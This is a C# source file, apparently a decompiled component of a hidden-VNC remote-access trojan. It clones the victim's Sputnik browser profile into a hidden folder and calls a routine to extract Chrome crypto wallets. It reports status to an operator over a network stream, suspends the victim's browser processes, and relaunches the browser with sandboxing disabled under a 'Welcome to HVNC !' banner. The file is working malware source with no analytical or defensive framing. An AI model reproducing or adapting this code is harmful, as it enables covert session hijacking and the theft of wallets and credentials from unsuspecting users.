using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser;

internal class Sputnik
{
	public static string user = Environment.UserName;

	internal const short SWP_NOMOVE = 2;

	internal const short SWP_NOSIZE = 1;

	internal const short SWP_NOZORDER = 4;

	internal const int SWP_SHOWWINDOW = 64;

	[DllImport("user32.Mother")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

	public static void StartSputnik(bool duplicate)
	{
		string fileName = "C:\\Program Files (x86)\\SputnikLab\\Sputnik\\Application\\Browser.exe";
		try
		{
			if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\ICARUS\\lockfile"))))
			{
				Outils.SendInformation(Outils.nstream, "25|Sputnik has already been opened!");
				return;
			}
			if (duplicate)
			{
				Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\User Data") / 1024.0 / 1024.0)));
				MonitorDirSize monitorDirSize = new MonitorDirSize();
				monitorDirSize.StartMonitoring(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\ICARUS");
				try
				{
					Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\User Data", Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\ICARUS", overwrite: true);
					HVNC.GetChromeWallets(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\ICARUS");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				monitorDirSize.StopMonitoring();
				Outils.SendInformation(Outils.nstream, "1002|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\User Data") / 1024.0 / 1024.0)));
			}
			else
			{
				Outils.SendInformation(Outils.nstream, "2002|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\User Data") / 1024.0 / 1024.0)));
			}
			Process[] processesByName = Process.GetProcessesByName("Browser");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.SuspendProcess(processesByName[i]);
			}
			Process.Start(fileName, "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\SputnikLab\\Sputnik\\ICARUS\" \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
			{
				Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
				Sputnik.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
				Application.DoEvents();
				if (stopwatch.ElapsedMilliseconds >= 10000)
				{
					return;
				}
			}
			stopwatch.Stop();
			processesByName = Process.GetProcessesByName("Browser");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.ResumeProcess(processesByName[i]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}